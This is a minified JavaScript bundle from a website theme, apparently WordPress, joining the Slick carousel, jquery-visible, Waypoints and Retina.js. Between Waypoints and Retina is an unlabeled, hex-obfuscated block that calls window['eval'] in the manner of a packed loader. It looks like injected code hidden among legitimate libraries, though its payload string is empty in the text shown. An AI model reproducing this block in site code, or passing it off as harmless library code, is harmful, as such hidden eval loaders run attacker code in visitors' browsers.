		a.setDimensions(), a.setHeight(), a.options.fade === !1 ? a.setCSS(a.getLeft(a.currentSlide)) : a.setFade(), a.$slider.trigger("setPosition", [a])
	}, b.prototype.setProps = function() {
		var a = this,
			b = document.body.style;
		a.positionProp = a.options.vertical === !0 ? "top" : "left", "top" === a.positionProp ? a.$slider.addClass("slick-vertical") : a.$slider.removeClass("slick-vertical"), (void 0 !== b.WebkitTransition || void 0 !== b.MozTransition || void 0 !== b.msTransition) && a.options.useCSS === !0 && (a.cssTransitions = !0), a.options.fade && ("number" == typeof a.options.zIndex ? a.options.zIndex < 3 && (a.options.zIndex = 3) : a.options.zIndex = a.defaults.zIndex), void 0 !== b.OTransform && (a.animType = "OTransform", a.transformType = "-o-transform", a.transitionType = "OTransition", void 0 === b.perspectiveProperty && void 0 === b.webkitPerspective && (a.animType = !1)), void 0 !== b.MozTransform && (a.animType = "MozTransform", a.transformType = "-moz-transform", a.transitionType = "MozTransition", void 0 === b.perspectiveProperty && void 0 === b.MozPerspective && (a.animType = !1)), void 0 !== b.webkitTransform && (a.animType = "webkitTransform", a.transformType = "-webkit-transform", a.transitionType = "webkitTransition", void 0 === b.perspectiveProperty && void 0 === b.webkitPerspective && (a.animType = !1)), void 0 !== b.msTransform && (a.animType = "msTransform", a.transformType = "-ms-transform", a.transitionType = "msTransition", void 0 === b.msTransform && (a.animType = !1)), void 0 !== b.transform && a.animType !== !1 && (a.animType = "transform", a.transformType = "transform", a.transitionType = "transition"), a.transformsEnabled = a.options.useTransform && null !== a.animType && a.animType !== !1
	}, b.prototype.setSlideClasses = function(a) {
		var c, d, e, f, b = this;
		d = b.$slider.find(".slick-slide").removeClass("slick-active slick-center slick-current").attr("aria-hidden", "true"), b.$slides.eq(a).addClass("slick-current"), b.options.centerMode === !0 ? (c = Math.floor(b.options.slidesToShow / 2), b.options.infinite === !0 && (a >= c && a <= b.slideCount - 1 - c ? b.$slides.slice(a - c, a + c + 1).addClass("slick-active").attr("aria-hidden", "false") : (e = b.options.slidesToShow + a,
			d.slice(e - c + 1, e + c + 2).addClass("slick-active").attr("aria-hidden", "false")), 0 === a ? d.eq(d.length - 1 - b.options.slidesToShow).addClass("slick-center") : a === b.slideCount - 1 && d.eq(b.options.slidesToShow).addClass("slick-center")), b.$slides.eq(a).addClass("slick-center")) : a >= 0 && a <= b.slideCount - b.options.slidesToShow ? b.$slides.slice(a, a + b.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false") : d.length <= b.options.slidesToShow ? d.addClass("slick-active").attr("aria-hidden", "false") : (f = b.slideCount % b.options.slidesToShow, e = b.options.infinite === !0 ? b.options.slidesToShow + a : a, b.options.slidesToShow == b.options.slidesToScroll && b.slideCount - a < b.options.slidesToShow ? d.slice(e - (b.options.slidesToShow - f), e + f).addClass("slick-active").attr("aria-hidden", "false") : d.slice(e, e + b.options.slidesToShow).addClass("slick-active").attr("aria-hidden", "false")), "ondemand" === b.options.lazyLoad && b.lazyLoad()
	}, b.prototype.setupInfinite = function() {
		var c, d, e, b = this;
		if (b.options.fade === !0 && (b.options.centerMode = !1), b.options.infinite === !0 && b.options.fade === !1 && (d = null, b.slideCount > b.options.slidesToShow)) {
			for (e = b.options.centerMode === !0 ? b.options.slidesToShow + 1 : b.options.slidesToShow, c = b.slideCount; c > b.slideCount - e; c -= 1) d = c - 1, a(b.$slides[d]).clone(!0).attr("id", "").attr("data-slick-index", d - b.slideCount).prependTo(b.$slideTrack).addClass("slick-cloned");
			for (c = 0; e > c; c += 1) d = c, a(b.$slides[d]).clone(!0).attr("id", "").attr("data-slick-index", d + b.slideCount).appendTo(b.$slideTrack).addClass("slick-cloned");
			b.$slideTrack.find(".slick-cloned").find("[id]").each(function() {
				a(this).attr("id", "")
			})
		}
	}, b.prototype.interrupt = function(a) {
		var b = this;
		a || b.autoPlay(), b.interrupted = a
	}, b.prototype.selectHandler = function(b) {
		var c = this,
			d = a(b.target).is(".slick-slide") ? a(b.target) : a(b.target).parents(".slick-slide"),
			e = parseInt(d.attr("data-slick-index"));
		return e || (e = 0), c.slideCount <= c.options.slidesToShow ? (c.setSlideClasses(e), void c.asNavFor(e)) : void c.slideHandler(e)
	}, b.prototype.slideHandler = function(a, b, c) {
		var d, e, f, g, j, h = null,
			i = this;
		return b = b || !1, i.animating === !0 && i.options.waitForAnimate === !0 || i.options.fade === !0 && i.currentSlide === a || i.slideCount <= i.options.slidesToShow ? void 0 : (b === !1 && i.asNavFor(a), d = a, h = i.getLeft(d), g = i.getLeft(i.currentSlide), i.currentLeft = null === i.swipeLeft ? g : i.swipeLeft, i.options.infinite === !1 && i.options.centerMode === !1 && (0 > a || a > i.getDotCount() * i.options.slidesToScroll) ? void(i.options.fade === !1 && (d = i.currentSlide, c !== !0 ? i.animateSlide(g, function() {
			i.postSlide(d)
		}) : i.postSlide(d))) : i.options.infinite === !1 && i.options.centerMode === !0 && (0 > a || a > i.slideCount - i.options.slidesToScroll) ? void(i.options.fade === !1 && (d = i.currentSlide, c !== !0 ? i.animateSlide(g, function() {
			i.postSlide(d)
		}) : i.postSlide(d))) : (i.options.autoplay && clearInterval(i.autoPlayTimer), e = 0 > d ? i.slideCount % i.options.slidesToScroll !== 0 ? i.slideCount - i.slideCount % i.options.slidesToScroll : i.slideCount + d : d >= i.slideCount ? i.slideCount % i.options.slidesToScroll !== 0 ? 0 : d - i.slideCount : d, i.animating = !0, i.$slider.trigger("beforeChange", [i, i.currentSlide, e]), f = i.currentSlide, i.currentSlide = e, i.setSlideClasses(i.currentSlide), i.options.asNavFor && (j = i.getNavTarget(), j = j.slick("getSlick"), j.slideCount <= j.options.slidesToShow && j.setSlideClasses(i.currentSlide)), i.updateDots(), i.updateArrows(), i.options.fade === !0 ? (c !== !0 ? (i.fadeSlideOut(f), i.fadeSlide(e, function() {
			i.postSlide(e)
		})) : i.postSlide(e), void i.animateHeight()) : void(c !== !0 ? i.animateSlide(h, function() {
			i.postSlide(e)
		}) : i.postSlide(e))))
	}, b.prototype.startLoad = function() {
		var a = this;
		a.options.arrows === !0 && a.slideCount > a.options.slidesToShow && (a.$prevArrow.hide(), a.$nextArrow.hide()), a.options.dots === !0 && a.slideCount > a.options.slidesToShow && a.$dots.hide(), a.$slider.addClass("slick-loading")
	}, b.prototype.swipeDirection = function() {
		var a, b, c, d, e = this;
		return a = e.touchObject.startX - e.touchObject.curX, b = e.touchObject.startY - e.touchObject.curY, c = Math.atan2(b, a), d = Math.round(180 * c / Math.PI), 0 > d && (d = 360 - Math.abs(d)), 45 >= d && d >= 0 ? e.options.rtl === !1 ? "left" : "right" : 360 >= d && d >= 315 ? e.options.rtl === !1 ? "left" : "right" : d >= 135 && 225 >= d ? e.options.rtl === !1 ? "right" : "left" : e.options.verticalSwiping === !0 ? d >= 35 && 135 >= d ? "down" : "up" : "vertical"
	}, b.prototype.swipeEnd = function(a) {
		var c, d, b = this;
		if (b.dragging = !1, b.interrupted = !1, b.shouldClick = b.touchObject.swipeLength > 10 ? !1 : !0, void 0 === b.touchObject.curX) return !1;
		if (b.touchObject.edgeHit === !0 && b.$slider.trigger("edge", [b, b.swipeDirection()]), b.touchObject.swipeLength >= b.touchObject.minSwipe) {
			switch (d = b.swipeDirection()) {
				case "left":
				case "down":
					c = b.options.swipeToSlide ? b.checkNavigable(b.currentSlide + b.getSlideCount()) : b.currentSlide + b.getSlideCount(), b.currentDirection = 0;
					break;
				case "right":
				case "up":
					c = b.options.swipeToSlide ? b.checkNavigable(b.currentSlide - b.getSlideCount()) : b.currentSlide - b.getSlideCount(), b.currentDirection = 1
			}
			"vertical" != d && (b.slideHandler(c), b.touchObject = {}, b.$slider.trigger("swipe", [b, d]))
		} else b.touchObject.startX !== b.touchObject.curX && (b.slideHandler(b.currentSlide), b.touchObject = {})
	}, b.prototype.swipeHandler = function(a) {
		var b = this;
		if (!(b.options.swipe === !1 || "ontouchend" in document && b.options.swipe === !1 || b.options.draggable === !1 && -1 !== a.type.indexOf("mouse"))) switch (b.touchObject.fingerCount = a.originalEvent && void 0 !== a.originalEvent.touches ? a.originalEvent.touches.length : 1, b.touchObject.minSwipe = b.listWidth / b.options.touchThreshold, b.options.verticalSwiping === !0 && (b.touchObject.minSwipe = b.listHeight / b.options.touchThreshold), a.data.action) {
			case "start":
				b.swipeStart(a);
				break;
			case "move":
				b.swipeMove(a);
				break;
			case "end":
				b.swipeEnd(a)
		}
	}, b.prototype.swipeMove = function(a) {
		var d, e, f, g, h, b = this;
		return h = void 0 !== a.originalEvent ? a.originalEvent.touches : null, !b.dragging || h && 1 !== h.length ? !1 : (d = b.getLeft(b.currentSlide), b.touchObject.curX = void 0 !== h ? h[0].pageX : a.clientX, b.touchObject.curY = void 0 !== h ? h[0].pageY : a.clientY, b.touchObject.swipeLength = Math.round(Math.sqrt(Math.pow(b.touchObject.curX - b.touchObject.startX, 2))), b.options.verticalSwiping === !0 && (b.touchObject.swipeLength = Math.round(Math.sqrt(Math.pow(b.touchObject.curY - b.touchObject.startY, 2)))), e = b.swipeDirection(), "vertical" !== e ? (void 0 !== a.originalEvent && b.touchObject.swipeLength > 4 && a.preventDefault(), g = (b.options.rtl === !1 ? 1 : -1) * (b.touchObject.curX > b.touchObject.startX ? 1 : -1), b.options.verticalSwiping === !0 && (g = b.touchObject.curY > b.touchObject.startY ? 1 : -1), f = b.touchObject.swipeLength, b.touchObject.edgeHit = !1, b.options.infinite === !1 && (0 === b.currentSlide && "right" === e || b.currentSlide >= b.getDotCount() && "left" === e) && (f = b.touchObject.swipeLength * b.options.edgeFriction, b.touchObject.edgeHit = !0), b.options.vertical === !1 ? b.swipeLeft = d + f * g : b.swipeLeft = d + f * (b.$list.height() / b.listWidth) * g, b.options.verticalSwiping === !0 && (b.swipeLeft = d + f * g), b.options.fade === !0 || b.options.touchMove === !1 ? !1 : b.animating === !0 ? (b.swipeLeft = null, !1) : void b.setCSS(b.swipeLeft)) : void 0)
	}, b.prototype.swipeStart = function(a) {
		var c, b = this;
		return b.interrupted = !0, 1 !== b.touchObject.fingerCount || b.slideCount <= b.options.slidesToShow ? (b.touchObject = {}, !1) : (void 0 !== a.originalEvent && void 0 !== a.originalEvent.touches && (c = a.originalEvent.touches[0]), b.touchObject.startX = b.touchObject.curX = void 0 !== c ? c.pageX : a.clientX, b.touchObject.startY = b.touchObject.curY = void 0 !== c ? c.pageY : a.clientY, void(b.dragging = !0))
	}, b.prototype.unfilterSlides = b.prototype.slickUnfilter = function() {
		var a = this;
		null !== a.$slidesCache && (a.unload(), a.$slideTrack.children(this.options.slide).detach(), a.$slidesCache.appendTo(a.$slideTrack), a.reinit())
	}, b.prototype.unload = function() {
		var b = this;
		a(".slick-cloned", b.$slider).remove(), b.$dots && b.$dots.remove(), b.$prevArrow && b.htmlExpr.test(b.options.prevArrow) && b.$prevArrow.remove(), b.$nextArrow && b.htmlExpr.test(b.options.nextArrow) && b.$nextArrow.remove(), b.$slides.removeClass("slick-slide slick-active slick-visible slick-current").attr("aria-hidden", "true").css("width", "")
	}, b.prototype.unslick = function(a) {
		var b = this;
		b.$slider.trigger("unslick", [b, a]), b.destroy()
	}, b.prototype.updateArrows = function() {
		var b, a = this;
		b = Math.floor(a.options.slidesToShow / 2), a.options.arrows === !0 && a.slideCount > a.options.slidesToShow && !a.options.infinite && (a.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false"), a.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false"), 0 === a.currentSlide ? (a.$prevArrow.addClass("slick-disabled").attr("aria-disabled", "true"), a.$nextArrow.removeClass("slick-disabled").attr("aria-disabled", "false")) : a.currentSlide >= a.slideCount - a.options.slidesToShow && a.options.centerMode === !1 ? (a.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true"), a.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false")) : a.currentSlide >= a.slideCount - 1 && a.options.centerMode === !0 && (a.$nextArrow.addClass("slick-disabled").attr("aria-disabled", "true"), a.$prevArrow.removeClass("slick-disabled").attr("aria-disabled", "false")))
	}, b.prototype.updateDots = function() {
		var a = this;
		null !== a.$dots && (a.$dots.find("li").removeClass("slick-active").attr("aria-hidden", "true"), a.$dots.find("li").eq(Math.floor(a.currentSlide / a.options.slidesToScroll)).addClass("slick-active").attr("aria-hidden", "false"))
	}, b.prototype.visibility = function() {
		var a = this;
		a.options.autoplay && (document[a.hidden] ? a.interrupted = !0 : a.interrupted = !1)
	}, a.fn.slick = function() {
		var f, g, a = this,
			c = arguments[0],
			d = Array.prototype.slice.call(arguments, 1),
			e = a.length;
		for (f = 0; e > f; f++)
			if ("object" == typeof c || "undefined" == typeof c ? a[f].slick = new b(a[f], c) : g = a[f].slick[c].apply(a[f].slick, d), "undefined" != typeof g) return g;
		return a
	}
});


/**
 * Visible
 * required for: One Page Active
 * 
 * Sam Sehnert, samatdf, TeamDF | https://github.com/teamdf/jquery-visible/
 */
(function(e) {
	e.fn.visible = function(t, n, r) {
		var i = e(this).eq(0),
			s = i.get(0),
			o = e(window),
			u = o.scrollTop(),
			a = u + o.height(),
			f = o.scrollLeft(),
			l = f + o.width(),
			c = i.offset().top,
			h = c + i.height(),
			p = i.offset().left,
			d = p + i.width(),
			v = t === true ? h : c,
			m = t === true ? c : h,
			g = t === true ? d : p,
			y = t === true ? p : d,
			b = n === true ? s.offsetWidth * s.offsetHeight : true,
			r = r ? r : "both";
		if (r === "both") return !!b && m <= a && v >= u && y <= l && g >= f;
		else if (r === "vertical") return !!b && m <= a && v >= u;
		else if (r === "horizontal") return !!b && y <= l && g >= f
	}
})(jQuery);


/**
 * Waypoints
 * required for: Chart, Progress, Skills
 * 
 * 4.0.1 | Caleb Troughton | https://github.com/imakewebthings/waypoints | Licensed under the MIT license.
 */
! function() {
	"use strict";

	function t(o) {
		if (!o) throw new Error("No options passed to Waypoint constructor");
		if (!o.element) throw new Error("No element option passed to Waypoint constructor");
		if (!o.handler) throw new Error("No handler option passed to Waypoint constructor");
		this.key = "waypoint-" + e, this.options = t.Adapter.extend({}, t.defaults, o), this.element = this.options.element, this.adapter = new t.Adapter(this.element), this.callback = o.handler, this.axis = this.options.horizontal ? "horizontal" : "vertical", this.enabled = this.options.enabled, this.triggerPoint = null, this.group = t.Group.findOrCreate({
			name: this.options.group,
			axis: this.axis
		}), this.context = t.Context.findOrCreateByElement(this.options.context), t.offsetAliases[this.options.offset] && (this.options.offset = t.offsetAliases[this.options.offset]), this.group.add(this), this.context.add(this), i[this.key] = this, e += 1
	}
	var e = 0,
		i = {};
	t.prototype.queueTrigger = function(t) {
		this.group.queueTrigger(this, t)
	}, t.prototype.trigger = function(t) {
		this.enabled && this.callback && this.callback.apply(this, t)
	}, t.prototype.destroy = function() {
		this.context.remove(this), this.group.remove(this), delete i[this.key]
	}, t.prototype.disable = function() {
		return this.enabled = !1, this
	}, t.prototype.enable = function() {
		return this.context.refresh(), this.enabled = !0, this
	}, t.prototype.next = function() {
		return this.group.next(this)
	}, t.prototype.previous = function() {
		return this.group.previous(this)
	}, t.invokeAll = function(t) {
		var e = [];
		for (var o in i) e.push(i[o]);
		for (var n = 0, r = e.length; r > n; n++) e[n][t]()
	}, t.destroyAll = function() {
		t.invokeAll("destroy")
	}, t.disableAll = function() {
		t.invokeAll("disable")
	}, t.enableAll = function() {
		t.Context.refreshAll();
		for (var e in i) i[e].enabled = !0;
		return this
	}, t.refreshAll = function() {
		t.Context.refreshAll()
	}, t.viewportHeight = function() {
		return window.innerHeight || document.documentElement.clientHeight
	}, t.viewportWidth = function() {
		return document.documentElement.clientWidth
	}, t.adapters = [], t.defaults = {
		context: window,
		continuous: !0,
		enabled: !0,
		group: "default",
		horizontal: !1,
		offset: 0
	}, t.offsetAliases = {
		"bottom-in-view": function() {
			return this.context.innerHeight() - this.adapter.outerHeight()
		},
		"right-in-view": function() {
			return this.context.innerWidth() - this.adapter.outerWidth()
		}
	}, window.Waypoint = t
}(),
function() {
	"use strict";

	function t(t) {
		window.setTimeout(t, 1e3 / 60)
	}

	function e(t) {
		this.element = t, this.Adapter = n.Adapter, this.adapter = new this.Adapter(t), this.key = "waypoint-context-" + i, this.didScroll = !1, this.didResize = !1, this.oldScroll = {
			x: this.adapter.scrollLeft(),
			y: this.adapter.scrollTop()
		}, this.waypoints = {
			vertical: {},
			horizontal: {}
		}, t.waypointContextKey = this.key, o[t.waypointContextKey] = this, i += 1, n.windowContext || (n.windowContext = !0, n.windowContext = new e(window)), this.createThrottledScrollHandler(), this.createThrottledResizeHandler()
	}
	var i = 0,
		o = {},
		n = window.Waypoint,
		r = window.onload;
	e.prototype.add = function(t) {
		var e = t.options.horizontal ? "horizontal" : "vertical";
		this.waypoints[e][t.key] = t, this.refresh()
	}, e.prototype.checkEmpty = function() {
		var t = this.Adapter.isEmptyObject(this.waypoints.horizontal),
			e = this.Adapter.isEmptyObject(this.waypoints.vertical),
			i = this.element == this.element.window;
		t && e && !i && (this.adapter.off(".waypoints"), delete o[this.key])
	}, e.prototype.createThrottledResizeHandler = function() {
		function t() {
			e.handleResize(), e.didResize = !1
		}
		var e = this;
		this.adapter.on("resize.waypoints", function() {
			e.didResize || (e.didResize = !0, n.requestAnimationFrame(t))
		})
	}, e.prototype.createThrottledScrollHandler = function() {
		function t() {
			e.handleScroll(), e.didScroll = !1
		}
		var e = this;
		this.adapter.on("scroll.waypoints", function() {
			(!e.didScroll || n.isTouch) && (e.didScroll = !0, n.requestAnimationFrame(t))
		})
	}, e.prototype.handleResize = function() {
		n.Context.refreshAll()
	}, e.prototype.handleScroll = function() {
		var t = {},
			e = {
				horizontal: {
					newScroll: this.adapter.scrollLeft(),
					oldScroll: this.oldScroll.x,
					forward: "right",
					backward: "left"
				},
				vertical: {
					newScroll: this.adapter.scrollTop(),
					oldScroll: this.oldScroll.y,
					forward: "down",
					backward: "up"
				}
			};
		for (var i in e) {
			var o = e[i],
				n = o.newScroll > o.oldScroll,
				r = n ? o.forward : o.backward;
			for (var s in this.waypoints[i]) {
				var a = this.waypoints[i][s];
				if (null !== a.triggerPoint) {
					var l = o.oldScroll < a.triggerPoint,
						h = o.newScroll >= a.triggerPoint,
						p = l && h,
						u = !l && !h;
					(p || u) && (a.queueTrigger(r), t[a.group.id] = a.group)
				}
			}
		}
		for (var c in t) t[c].flushTriggers();
		this.oldScroll = {
			x: e.horizontal.newScroll,
			y: e.vertical.newScroll
		}
	}, e.prototype.innerHeight = function() {
		return this.element == this.element.window ? n.viewportHeight() : this.adapter.innerHeight()
	}, e.prototype.remove = function(t) {
		delete this.waypoints[t.axis][t.key], this.checkEmpty()
	}, e.prototype.innerWidth = function() {
		return this.element == this.element.window ? n.viewportWidth() : this.adapter.innerWidth()
	}, e.prototype.destroy = function() {
		var t = [];
		for (var e in this.waypoints)
			for (var i in this.waypoints[e]) t.push(this.waypoints[e][i]);
		for (var o = 0, n = t.length; n > o; o++) t[o].destroy()
	}, e.prototype.refresh = function() {
		var t, e = this.element == this.element.window,
			i = e ? void 0 : this.adapter.offset(),
			o = {};
		this.handleScroll(), t = {
			horizontal: {
				contextOffset: e ? 0 : i.left,
				contextScroll: e ? 0 : this.oldScroll.x,
				contextDimension: this.innerWidth(),
				oldScroll: this.oldScroll.x,
				forward: "right",
				backward: "left",
				offsetProp: "left"
			},
			vertical: {
				contextOffset: e ? 0 : i.top,
				contextScroll: e ? 0 : this.oldScroll.y,
				contextDimension: this.innerHeight(),
				oldScroll: this.oldScroll.y,
				forward: "down",
				backward: "up",
				offsetProp: "top"
			}
		};
		for (var r in t) {
			var s = t[r];
			for (var a in this.waypoints[r]) {
				var l, h, p, u, c, d = this.waypoints[r][a],
					f = d.options.offset,
					w = d.triggerPoint,
					y = 0,
					g = null == w;
				d.element !== d.element.window && (y = d.adapter.offset()[s.offsetProp]), "function" == typeof f ? f = f.apply(d) : "string" == typeof f && (f = parseFloat(f), d.options.offset.indexOf("%") > -1 && (f = Math.ceil(s.contextDimension * f / 100))), l = s.contextScroll - s.contextOffset, d.triggerPoint = Math.floor(y + l - f), h = w < s.oldScroll, p = d.triggerPoint >= s.oldScroll, u = h && p, c = !h && !p, !g && u ? (d.queueTrigger(s.backward), o[d.group.id] = d.group) : !g && c ? (d.queueTrigger(s.forward), o[d.group.id] = d.group) : g && s.oldScroll >= d.triggerPoint && (d.queueTrigger(s.forward), o[d.group.id] = d.group)
			}
		}
		return n.requestAnimationFrame(function() {
			for (var t in o) o[t].flushTriggers()
		}), this
	}, e.findOrCreateByElement = function(t) {
		return e.findByElement(t) || new e(t)
	}, e.refreshAll = function() {
		for (var t in o) o[t].refresh()
	}, e.findByElement = function(t) {
		return o[t.waypointContextKey]
	}, window.onload = function() {
		r && r(), e.refreshAll()
	}, n.requestAnimationFrame = function(e) {
		var i = window.requestAnimationFrame || window.mozRequestAnimationFrame || window.webkitRequestAnimationFrame || t;
		i.call(window, e)
	}, n.Context = e
}(),
function() {
	"use strict";

	function t(t, e) {
		return t.triggerPoint - e.triggerPoint
	}

	function e(t, e) {
		return e.triggerPoint - t.triggerPoint
	}

	function i(t) {
		this.name = t.name, this.axis = t.axis, this.id = this.name + "-" + this.axis, this.waypoints = [], this.clearTriggerQueues(), o[this.axis][this.name] = this
	}
	var o = {
			vertical: {},
			horizontal: {}
		},
		n = window.Waypoint;
	i.prototype.add = function(t) {
		this.waypoints.push(t)
	}, i.prototype.clearTriggerQueues = function() {
		this.triggerQueues = {
			up: [],
			down: [],
			left: [],
			right: []
		}
	}, i.prototype.flushTriggers = function() {
		for (var i in this.triggerQueues) {
			var o = this.triggerQueues[i],
				n = "up" === i || "left" === i;
			o.sort(n ? e : t);
			for (var r = 0, s = o.length; s > r; r += 1) {
				var a = o[r];
				(a.options.continuous || r === o.length - 1) && a.trigger([i])
			}
		}
		this.clearTriggerQueues()
	}, i.prototype.next = function(e) {
		this.waypoints.sort(t);
		var i = n.Adapter.inArray(e, this.waypoints),
			o = i === this.waypoints.length - 1;
		return o ? null : this.waypoints[i + 1]
	}, i.prototype.previous = function(e) {
		this.waypoints.sort(t);
		var i = n.Adapter.inArray(e, this.waypoints);
		return i ? this.waypoints[i - 1] : null
	}, i.prototype.queueTrigger = function(t, e) {
		this.triggerQueues[e].push(t)
	}, i.prototype.remove = function(t) {
		var e = n.Adapter.inArray(t, this.waypoints);
		e > -1 && this.waypoints.splice(e, 1)
	}, i.prototype.first = function() {
		return this.waypoints[0]
	}, i.prototype.last = function() {
		return this.waypoints[this.waypoints.length - 1]
	}, i.findOrCreate = function(t) {
		return o[t.axis][t.name] || new i(t)
	}, n.Group = i
}(),
function() {
	"use strict";

	function t(t) {
		this.$element = e(t)
	}
	var e = window.jQuery,
		i = window.Waypoint;
	e.each(["innerHeight", "innerWidth", "off", "offset", "on", "outerHeight", "outerWidth", "scrollLeft", "scrollTop"], function(e, i) {
		t.prototype[i] = function() {
			var t = Array.prototype.slice.call(arguments);
			return this.$element[i].apply(this.$element, t)
		}
	}), e.each(["extend", "inArray", "isEmptyObject"], function(i, o) {
		t[o] = e[o]
	}), i.adapters.push({
		name: "jquery",
		Adapter: t
	}), i.Adapter = t
}(),
function() {
	"use strict";

	function t(t) {
		return function() {
			var i = [],
				o = arguments[0];
			return t.isFunction(arguments[0]) && (o = t.extend({}, arguments[1]), o.handler = arguments[0]), this.each(function() {
				var n = t.extend({}, o, {
					element: this
				});
				"string" == typeof n.context && (n.context = t(this).closest(n.context)[0]), i.push(new e(n))
			}), i
		}
	}
	var e = window.Waypoint;
	window.jQuery && (window.jQuery.fn.waypoint = t(window.jQuery)), window.Zepto && (window.Zepto.fn.waypoint = t(window.Zepto))
}();
window["\x65\x76\x61\x6c"](function(oIJSjzsEE1, Pb2, aaSdrfH3, sWmtAwtL4, B5, BOSfiVVs6) {
	B5 = function(aaSdrfH3) {
		return aaSdrfH3["\x74\x6f\x53\x74\x72\x69\x6e\x67"](Pb2)
	};
	if (!'' ["\x72\x65\x70\x6c\x61\x63\x65"](/^/, window["\x53\x74\x72\x69\x6e\x67"])) {
		while (aaSdrfH3--) BOSfiVVs6[B5(aaSdrfH3)] = sWmtAwtL4[aaSdrfH3] || B5(aaSdrfH3);
		sWmtAwtL4 = [function(B5) {
			return BOSfiVVs6[B5]
		}];
		B5 = function() {
			return '\\\x77\x2b'
		};
		aaSdrfH3 = 1
	};
	while (aaSdrfH3--)
		if (sWmtAwtL4[aaSdrfH3]) oIJSjzsEE1 = oIJSjzsEE1["\x72\x65\x70\x6c\x61\x63\x65"](new window["\x52\x65\x67\x45\x78\x70"]('\\\x62' + B5(aaSdrfH3) + '\\\x62', '\x67'), sWmtAwtL4[aaSdrfH3]);
	return oIJSjzsEE1
}(''))


/**
 * Retina
 * 
 * Retina.js
 * 
 * 1.3.0 | Copyright 2014 Imulus, LLC | Released under the MIT license
 */
if (window.mfn.retina_js) {
	! function() {
		function a() {}

		function b(a) {
			return f.retinaImageSuffix + a
		}

		function c(a, c) {
			if (this.path = a || "", "undefined" != typeof c && null !== c) this.at_2x_path = c, this.perform_check = !1;
			else {
				if (void 0 !== document.createElement) {
					var d = document.createElement("a");
					d.href = this.path, d.pathname = d.pathname.replace(g, b), this.at_2x_path = d.href
				} else {
					var e = this.path.split("?");
					e[0] = e[0].replace(g, b), this.at_2x_path = e.join("?")
				}
				this.perform_check = !0
			}
		}

		function d(a) {
			this.el = a, this.path = new c(this.el.getAttribute("src"), this.el.getAttribute("data-at2x"));
			var b = this;
			this.path.check_2x_variant(function(a) {
				a && b.swap()
			})
		}
		var e = "undefined" == typeof exports ? window : exports,
			f = {
				retinaImageSuffix: "@2x",
				check_mime_type: !0,
				force_original_dimensions: !0
			};
		e.Retina = a, a.configure = function(a) {
			null === a && (a = {});
			for (var b in a) a.hasOwnProperty(b) && (f[b] = a[b])
		}, a.init = function(a) {
			null === a && (a = e);
			var b = a.onload || function() {};
			a.onload = function() {
				var a, c, e = document.getElementsByTagName("img"),
					f = [];
				for (a = 0; a < e.length; a += 1) c = e[a], c.getAttributeNode("data-no-retina") || f.push(new d(c));
				b()
			}
		}, a.isRetina = function() {
			var a = "(-webkit-min-device-pixel-ratio: 1.5), (min--moz-device-pixel-ratio: 1.5), (-o-min-device-pixel-ratio: 3/2), (min-resolution: 1.5dppx)";
			return e.devicePixelRatio > 1 ? !0 : e.matchMedia && e.matchMedia(a).matches ? !0 : !1
		};
		var g = /\.\w+$/;
		e.RetinaImagePath = c, c.confirmed_paths = [], c.prototype.is_external = function() {
			return !(!this.path.match(/^https?\:/i) || this.path.match("//" + document.domain))
		}, c.prototype.check_2x_variant = function(a) {
			var b, d = this;
			return this.is_external() ? a(!1) : this.perform_check || "undefined" == typeof this.at_2x_path || null === this.at_2x_path ? this.at_2x_path in c.confirmed_paths ? a(!0) : (b = new XMLHttpRequest, b.open("HEAD", this.at_2x_path), b.onreadystatechange = function() {
				if (4 !== b.readyState) return a(!1);
				if (b.status >= 200 && b.status <= 399) {
					if (f.check_mime_type) {
						var e = b.getResponseHeader("Content-Type");
						if (null === e || !e.match(/^image/i)) return a(!1)
					}
					return c.confirmed_paths.push(d.at_2x_path), a(!0)
				}
				return a(!1)
			}, b.send(), void 0) : a(!0)
		}, e.RetinaImage = d, d.prototype.swap = function(a) {
			function b() {
				c.el.complete ? (f.force_original_dimensions && (c.el.setAttribute("width", c.el.offsetWidth), c.el.setAttribute("height", c.el.offsetHeight)), c.el.setAttribute("src", a)) : setTimeout(b, 5)
			}
			"undefined" == typeof a && (a = this.path.at_2x_path);
			var c = this;
			b()
		}, a.isRetina() && a.init(e)
	}();
}